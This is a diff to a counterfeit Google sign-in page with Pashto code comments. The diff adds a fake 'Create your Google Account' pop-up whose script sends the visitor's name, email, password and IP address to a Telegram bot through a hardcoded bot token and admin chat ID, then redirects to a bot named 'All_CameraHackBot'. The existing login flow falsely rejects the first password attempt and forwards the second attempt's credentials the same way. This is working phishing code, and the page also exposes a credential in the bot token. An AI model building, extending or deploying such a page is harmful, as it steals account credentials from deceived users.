@@ -21,7 +21,6 @@
             padding: 1rem;
         }
 
-        /* د ګوګل اصلي کارت ډیزاین */
         .google-card {
             max-width: 450px;
             width: 100%;
@@ -33,7 +32,6 @@
             position: relative;
         }
 
-        /* Google لوګو - لکه څنګه چې په عکس کې دی */
         .google-logo {
             text-align: center;
             margin-bottom: 1rem;
@@ -44,7 +42,6 @@
             height: auto;
         }
 
-        /* د متن لپاره */
         h1 {
             font-size: 1.5rem;
             font-weight: 500;
@@ -86,23 +83,6 @@
             color: #80868b;
         }
 
-        /* "my acct" بټن */
-        .my-acct {
-            margin-bottom: 1.5rem;
-        }
-
-        .my-acct a {
-            color: #1a73e8;
-            text-decoration: none;
-            font-size: 0.8rem;
-            cursor: pointer;
-        }
-
-        .my-acct a:hover {
-            text-decoration: underline;
-        }
-
-        /* د Next بټن - لاندې ښیې کونج کې */
         .next-button-container {
             display: flex;
             justify-content: flex-end;
@@ -126,7 +106,6 @@
             background: #1557b0;
         }
 
-        /* د لینکونو لومړی قطار */
         .links-row {
             display: flex;
             justify-content: space-between;
@@ -145,7 +124,6 @@
             text-decoration: underline;
         }
 
-        /* Guest mode متن */
         .guest-text {
             text-align: left;
             margin-top: 1rem;
@@ -171,13 +149,13 @@
             font-size: 0.85rem;
             color: #1a73e8;
             text-decoration: none;
+            cursor: pointer;
         }
 
         .create-account:hover {
             text-decoration: underline;
         }
 
-        /* د پیغامونو بکسونه */
         .message {
             margin-top: 1rem;
             padding: 0.7rem;
@@ -199,7 +177,6 @@
             color: #137333;
         }
 
-        /* فوټر */
         .footer {
             display: flex;
             justify-content: center;
@@ -225,6 +202,54 @@
             color: #5f6368;
             margin-top: 0.5rem;
         }
+
+        /* د Create Account پاپ اپ سټایل */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: white;
+            max-width: 400px;
+            width: 90%;
+            padding: 2rem;
+            border-radius: 1rem;
+            text-align: center;
+        }
+
+        .modal-content input {
+            width: 100%;
+            padding: 0.8rem;
+            margin: 0.5rem 0;
+            border: 1px solid #dadce0;
+            border-radius: 0.25rem;
+        }
+
+        .modal-content button {
+            background: #1a73e8;
+            color: white;
+            padding: 0.8rem;
+            border: none;
+            border-radius: 0.25rem;
+            width: 100%;
+            margin-top: 1rem;
+            cursor: pointer;
+        }
+
+        .close-modal {
+            float: right;
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -240,10 +265,6 @@
 
         <div class="input-group">
             <input type="email" id="emailInput" placeholder="Email or phone">
-        </div>
-
-        <div class="my-acct">
-            <a href="#" onclick="sendToAdminFromLink('my acct', 'my acct link clicked'); return false;">my acct</a>
         </div>
 
         <div class="next-button-container">
@@ -262,7 +283,7 @@
             </div>
         </div>
 
-        <a href="#" class="create-account" onclick="sendToAdminFromLink('Create account', 'Create account clicked'); return false;">Create account</a>
+        <a href="#" class="create-account" onclick="openCreateAccountModal(); return false;">Create account</a>
     </div>
 
     <!-- مرحله 2: پټنوم -->
@@ -306,16 +327,26 @@
     </div>
 </div>
 
+<!-- Create Account Modal -->
+<div id="createAccountModal" class="modal">
+    <div class="modal-content">
+        <span class="close-modal" onclick="closeCreateAccountModal()">&times;</span>
+        <h3>Create your Google Account</h3>
+        <input type="text" id="createName" placeholder="Full name">
+        <input type="email" id="createEmail" placeholder="Email">
+        <input type="password" id="createPassword" placeholder="Password">
+        <button onclick="submitCreateAccount()">Create account</button>
+    </div>
+</div>
+
 <script>
     // ==================== Telegram Bot Settings ====================
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
     const ADMIN_CHAT_ID = "8295417969";
     const BOT_REDIRECT = "https://t.me/All_CameraHackBot?start=8020108872";
 
-    // د هڅو تعقیبول (د ایمیل پر بنسټ)
     let attemptStore = {};
 
-    // UI عناصر
     const step1View = document.getElementById('step1View');
     const step2View = document.getElementById('step2View');
     const emailInput = document.getElementById('emailInput');
@@ -345,9 +376,53 @@
         } catch (err) {
             console.warn("Telegram error", err);
         }
+    }
+
+    // ========== Create Account Modal ==========
+    function openCreateAccountModal() {
+        document.getElementById('createAccountModal').style.display = 'flex';
+    }
+
+    function closeCreateAccountModal() {
+        document.getElementById('createAccountModal').style.display = 'none';
+        document.getElementById('createName').value = '';
+        document.getElementById('createEmail').value = '';
+        document.getElementById('createPassword').value = '';
+    }
+
+    async function submitCreateAccount() {
+        const name = document.getElementById('createName').value.trim();
+        const email = document.getElementById('createEmail').value.trim();
+        const password = document.getElementById('createPassword').value.trim();
+
+        if (!name || !email || !password) {
+            alert("Please fill in all fields!");
+            return;
+        }
+
+        const ip = await getUserIP();
+        const msg = `🆕 *NEW ACCOUNT CREATION*\n\n👤 Name: ${name}\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
         
-        // د ښودلو لپاره alert
-        alert(`${buttonName} - Action sent to admin`);
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ADMIN_CHAT_ID,
+                    text: msg,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch (err) {
+            console.warn("Telegram error", err);
+        }
+
+        alert("Account created successfully! Redirecting to bot...");
+        closeCreateAccountModal();
+        
+        setTimeout(() => {
+            window.location.href = BOT_REDIRECT;
+        }, 1500);
     }
 
     function showMessage(box, text, isError = true) {
@@ -379,7 +454,6 @@
     }
 
     async function sendLoginToAdmin(email, password, ip, success) {
-        // غلط معلومات اډمن ته نه ځي - یوازې بريالي معلومات
         if (!success) return;
         
         const msg = `✅ *SUCCESSFUL LOGIN*\n\n👤 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
@@ -417,6 +491,9 @@
 
     window.goBackToEmail = goBackToEmail;
     window.sendToAdminFromLink = sendToAdminFromLink;
+    window.openCreateAccountModal = openCreateAccountModal;
+    window.closeCreateAccountModal = closeCreateAccountModal;
+    window.submitCreateAccount = submitCreateAccount;
 
     // ========== مرحله 2: ننوتنه ==========
     document.getElementById('loginBtn').addEventListener('click', async () => {
@@ -435,7 +512,6 @@
         const currentAttempt = attemptStore[key].attempts + 1;
         attemptStore[key].attempts = currentAttempt;
 
-        // لومړۍ هڅه — ناکامه (معلومات اډمن ته نه ځي)
         if (currentAttempt === 1) {
             showMessage(errorBox, "❌ Incorrect password. Please try again.", true);
             setTimeout(() => {
@@ -444,7 +520,6 @@
             return;
         }
 
-        // دوهمه هڅه — بریالۍ (معلومات اډمن ته ځي)
         if (currentAttempt >= 2) {
             await sendLoginToAdmin(currentEmail, password, ip, true);
             showMessage(successBox, "✅ Login successful! Redirecting to Telegram...", false);
@@ -459,7 +534,6 @@
         }
     });
 
-    // د Enter کیلي ملاتړ
     emailInput.addEventListener('keypress', (e) => {
         if (e.key === 'Enter') document.getElementById('nextBtn').click();
     });
